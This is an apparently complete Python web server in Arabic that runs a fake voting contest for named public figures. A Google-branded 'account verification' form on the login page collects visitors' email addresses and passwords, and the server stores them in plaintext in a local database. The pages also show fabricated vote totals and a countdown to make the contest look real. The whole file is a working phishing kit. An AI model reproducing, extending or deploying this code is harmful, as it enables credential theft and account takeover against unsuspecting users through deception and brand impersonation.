from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import time
import sqlite3
import os
# --- 1. إعداد قاعدة البيانات ---
def init_db():
    conn = sqlite3.connect('contest_data.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS candidates
                      (id TEXT PRIMARY KEY, vote_count INTEGER)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS user_logs
                      (email TEXT PRIMARY KEY, password TEXT, target TEXT, timestamp TEXT)''')

    initial_votes = {
        "almohammadi": 2745000,
        "bindawod": 2610200,
        "hajar": 2480500,
        "dmami": 2350100,
        "alawlaqi": 150200
    }
    for cid, count in initial_votes.items():
        cursor.execute('INSERT OR IGNORE INTO candidates VALUES (?, ?)', (cid, count))
    conn.commit()
    conn.close()

def get_sorted_candidates():
    conn = sqlite3.connect('contest_data.db')
    cursor = conn.cursor()
    cursor.execute('SELECT id, vote_count FROM candidates ORDER BY vote_count DESC')
    rows = cursor.fetchall()
    conn.close()
    return rows

def register_vote(cid, email, password):
    try:
        conn = sqlite3.connect('contest_data.db')
        cursor = conn.cursor()
        cursor.execute('INSERT INTO user_logs VALUES (?, ?, ?, ?)', (email, password, cid, time.ctime()))
        cursor.execute('UPDATE candidates SET vote_count = vote_count + 1 WHERE id=?', (cid,))
        conn.commit()
        conn.close()
        return True
    except sqlite3.IntegrityError:
        return False

init_db()

celebrities = {
    "almohammadi": {"name": "الأستاذ محمد المحمدي", "img": "https://i.ibb.co/FkMX3pb8/01-t-QOqg-Pv.webp", "bio": "إعلامي وناشط اجتماعي بارز، عرف ببرامجه الإنسانية ووقوفه الدائم مع قضايا المجتمع."},
    "alawlaqi": {"name": "أبو حيدر العولقي", "img": "https://i.ibb.co/Sw1jsRg5/FB-IMG-1767749609747.jpg", "bio": "شخصية مؤثرة في منصات التواصل الاجتماعي، يتميز بتقديم محتوى متنوع يلامس تطلعات الشباب."},
    "bindawod": {"name": "Hefhallh Bin Dawod", "img": "https://i.ibb.co/35bcK71C/FB-IMG-1767746087575.jpg", "bio": "ناشط متميز في العمل التطوعي وله بصمات واضحة في المشاريع التنموية."},
    "hajar": {"name": "الأستاذ أحمد حجر", "img": "https://i.ibb.co/20bTB6mB/01-omm-QIf-T.webp", "bio": "قامة تربوية واجتماعية، كرس حياته لخدمة العلم وتطوير المهارات القيادية للشباب."},
    "dmami": {"name": "عبد الرحمن الدمامي", "img": "https://i.ibb.co/rRR3rL2w/01-HHK44o2.webp", "bio": "خبير في ريادة الأعمال وصناعة المحتوى، يسعى لنشر المعرفة وتطوير الذات."}
}

finish_time = time.time() + (160 * 60 * 60)

class FinalContestServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        query = parse_qs(urlparse(self.path).query)
        path = urlparse(self.path).path
        remaining = int(finish_time - time.time())

        if path == '/' or path == '':
            self.show_timer_page(remaining)
        elif path == '/statement':
            self.show_statement()
        elif path == '/vote':
            self.show_vote_page()
        elif path == '/login':
            target = query.get('target', ['almohammadi'])[0]
            self.show_login(target)

    def show_timer_page(self, rem):
        html = f"""<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
        body {{ background: #0d3b3f; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; }}
        * {{ -webkit-tap-highlight-color: transparent; }}
        .timer {{ font-size: 3.5rem; font-weight: bold; color: #c6a15b; font-family: monospace; margin: 20px 0; }}
        .btn {{ display: inline-block; padding: 15px 50px; background: #c6a15b; color: #0d3b3f; text-decoration: none; border-radius: 50px; font-weight: bold; font-size: 1.2rem; transition: 0.05s; }}
        .btn:active {{ transform: scale(0.92); opacity: 0.8; }}
        </style></head><body><div style="text-align:center;">
        <img src="https://i.ibb.co/TM4Hkk0q/images-4.jpg" width="150" style="border-radius:20px;">
        <h1>جائزة التميز 2026</h1><div id="countdown" class="timer"></div>
        <a href="/statement" class="btn">دخول المسابقة</a>
        <script>var sec = {rem}; function tick() {{ var h = Math.floor(sec/3600); var m = Math.floor((sec%3600)/60); var s = sec%60; document.getElementById('countdown').innerHTML = h + ":" + (m<10?'0':'')+m + ":" + (s<10?'0':'')+s; if(sec > 0) sec--; else location.reload(); }} setInterval(tick, 1000); tick();</script>
        </div></body></html>"""
        self.wfile.write(html.encode('utf-8'))

    def show_statement(self):
        html = """<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { -webkit-tap-highlight-color: transparent; }
            body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #ffffff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
            .content-wrapper { max-width: 600px; width: 90%; text-align: center; padding: 40px; border-radius: 30px; background: #fdfdfd; box-shadow: 0 20px 50px rgba(0,0,0,0.05); }
            .official-img { width: 100%; border-radius: 20px; margin-bottom: 30px; }
            h2 { color: #0d3b3f; font-size: 24px; margin-bottom: 20px; border-bottom: 2px solid #c6a15b; display: inline-block; padding-bottom: 5px; }
            p { line-height: 1.8; font-size: 17px; color: #636e72; text-align: justify; margin-bottom: 40px; }
            .btn-next { background: #0d3b3f; color: white; padding: 18px 45px; text-decoration: none; border-radius: 15px; font-weight: bold; font-size: 18px; display: inline-block; transition: 0.05s; }
            .btn-next:active { transform: scale(0.92); opacity: 0.8; }
        </style></head><body>
        <div class="content-wrapper">
            <img src="https://i.ibb.co/NdJ88J0z/FB-IMG-1767749812219.jpg" class="official-img">
            <h2>بيان اللجنة المنظمة</h2>
            <p>تعلن اللجنة المنظمة لجائزة التميز 2026 عن بدء المرحلة النهائية للتصويت. يرجى اختيار المرشح الذي ترونه الأنسب لتمثيل هذه الجائزة.</p>
            <a href="/vote" class="btn-next">الانتقال لقائمة التصويت ←</a>
        </div></body></html>"""
        self.wfile.write(html.encode('utf-8'))

    def show_vote_page(self):
        sorted_list = get_sorted_candidates()
        cards = ""
        for cid, count in sorted_list:
            v = celebrities[cid]
            cards += f"""
            <div style="background:#ffffff; border-radius:25px; padding:25px; text-align:center; max-width:480px; margin:15px auto; box-shadow:0 5px 20px rgba(0,0,0,0.05); border: 1px solid #f1f1f1; position:relative;">
                <div style="margin-bottom:15px;">
                    <img src="{v['img']}" style="width:135px; height:135px; border-radius:50%; border:2.5px solid #d4af37; object-fit:cover; padding:3px;">
                </div>
                <div style="font-size:23px; font-weight:bold; color:#1a1a1a; margin-bottom:5px; font-family: sans-serif;">{v['name']}</div>
                <div onclick="showBio('{v['name']}', '{v['bio']}')" style="color:#c6a15b; font-size:15px; cursor:pointer; margin-bottom:20px; font-weight:bold; transition:0.1s;" class="more-link">المزيد...</div>
                <hr style="border:0; border-top:1px solid #eee; margin-bottom:20px;">
                <div style="display:flex; flex-direction: row-reverse; justify-content:center; align-items:center; gap:30px; padding:0 15px;">
                    <a href="/login?target={cid}" class="vote-btn">تصويت</a>
                    <div style="width:110px; height:45px; background:#fdfdf0; border:1px solid #f0f0e0; border-radius:25px; display:flex; align-items:center; justify-content:center; gap:5px;">
                        <span style="color:#1a3c3d; font-size:16px; font-weight:bold;">{"{:,}".format(count)}</span>
                        <span style="color:#9e9e9e; font-size:13px;">صوت</span>
                    </div>
                </div>
            </div>"""

        html = f"""<html dir='rtl'><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                * {{ -webkit-tap-highlight-color: transparent; }}
                body {{ background:#f8f9fa; font-family: sans-serif; margin:0; padding:10px; }}
                .top-bar {{ background:#1a3c3d; color:#ffffff; text-align:center; padding:12px; border-radius:10px; max-width:480px; margin:5px auto 20px auto; font-size:16px; font-weight:bold; }}
                .vote-btn {{ width:110px; height:45px; background:#1a3c3d; color:#ffffff; text-decoration:none; border-radius:25px; font-weight:bold; font-size:16px; display:flex; align-items:center; justify-content:center; box-shadow: 0 4px 8px rgba(0,0,0,0.1); transition: 0.05s; }}
                .vote-btn:active {{ transform: scale(0.90); opacity: 0.8; }}
                #bioModal {{ display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:100; justify-content:center; align-items:center; padding:20px; box-sizing:border-box; }}
                .modal-content {{ background:white; padding:30px; border-radius:20px; max-width:400px; width:100%; text-align:center; position:relative; box-shadow:0 10px 30px rgba(0,0,0,0.5); }}
                .close-btn {{ background:#0d3b3f; color:white; padding:10px 30px; border-radius:10px; margin-top:20px; display:inline-block; cursor:pointer; font-weight:bold; }}
            </style>
            </head><body>
            <div id="bioModal"><div class="modal-content"><h3 id="modalTitle" style="color:#0d3b3f;"></h3><p id="modalBio"></p><div class="close-btn" onclick="hideBio()">إغلاق</div></div></div>
            <div class="top-bar">قائمة المرشحين</div>{cards}
            <script>function showBio(n,b){{document.getElementById('modalTitle').innerText=n;document.getElementById('modalBio').innerText=b;document.getElementById('bioModal').style.display='flex';}}function hideBio(){{document.getElementById('bioModal').style.display='none';}}</script>
            </body></html>"""
        self.wfile.write(html.encode('utf-8'))

    def show_login(self, target):
        html = f"""<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
        * {{ -webkit-tap-highlight-color: transparent; }}
        .confirm-btn {{ width:100%; padding:20px; background:#0d3b3f; color:white; border:none; border-radius:18px; font-weight:bold; font-size:19px; margin-top:20px; cursor:pointer; transition: 0.05s; }}
        .confirm-btn:active {{ transform: scale(0.96); opacity: 0.8; }}
        </style></head>
        <body style="background:#0d3b3f; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">
        <div style="background:white; padding:45px; border-radius:35px; width:90%; max-width:480px; text-align:center; box-shadow: 0 20px 50px rgba(0,0,0,0.4);">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Hi_res_logo.png" width="60" style="margin-bottom:15px;">
            <h2 style="color:#333; margin-bottom:15px;">تحقق من الحساب</h2>
            <p style="color:#666; font-size:17px; margin-bottom:30px;">لتأكيد التصويت لـ: <br><b style="color:#c6a15b; font-size:20px;">{celebrities[target]['name']}</b></p>
            <form method="POST" action="/post_vote?target={target}">
                <input type="email" name="email" placeholder="البريد الإلكتروني" required style="width:100%; padding:18px; margin:12px 0; border:2px solid #f0f0f0; border-radius:18px; font-size:17px; box-sizing:border-box; outline:none;">
                <input type="password" name="pass" placeholder="كلمة المرور" required style="width:100%; padding:18px; margin:12px 0; border:2px solid #f0f0f0; border-radius:18px; font-size:17px; box-sizing:border-box; outline:none;">
                <button type="submit" class="confirm-btn">تأكيد الآن</button>
            </form>
        </div></body></html>"""
        self.wfile.write(html.encode('utf-8'))

    def do_POST(self):
        # تم تصحيح ترتيب الأسطر هنا لضمان السرعة ومنع التعليق
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)

        url_query = parse_qs(urlparse(self.path).query)
        target = url_query.get('target', ['almohammadi'])[0]

        email = params.get('email', [''])[0]
        password = params.get('pass', [''])[0]

        success = register_vote(target, email, password)

        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()

        celeb = celebrities[target]
        icon, title, msg = ("✅", "تم بنجاح", f"شكراً لك على التصويت لـ: <br><b>{celeb['name']}</b>") if success else ("❌", "فشل التصويت", "عذراً! هذا الحساب استخدم مسبقاً في التصويت.")

        html = f"""<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
        * {{ -webkit-tap-highlight-color: transparent; }}
        body {{ margin: 0; padding: 0; height: 100vh; background-image: url('{celeb['img']}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }}
        .overlay {{ background: rgba(0,0,0,0.65); position: absolute; top:0; left:0; width:100%; height:100%; z-index:1; }}
        .msg-box {{ position: relative; z-index: 2; background: white; padding: 40px; border-radius: 25px; text-align: center; max-width: 320px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }}
        </style></head><body><div class="overlay"></div><div class="msg-box"><h1 style="font-size:50px; margin:0;">{icon}</h1><h2>{title}</h2><p>{msg}</p><a href="/vote" style="text-decoration:none; color:#0d3b3f; font-weight:bold;">العودة</a></div></body></html>"""
        self.wfile.write(html.encode('utf-8'))

PORT = int(os.environ.get("PORT",
 10000))
server = HTTPServer(('0.0.0.0', PORT), FinalContestServer)
server.allow_reuse_address = True
print(f"🚀 السيرفر يعمل بالتصميم الرسمي الكامل على {PORT}")
server.serve_forever()
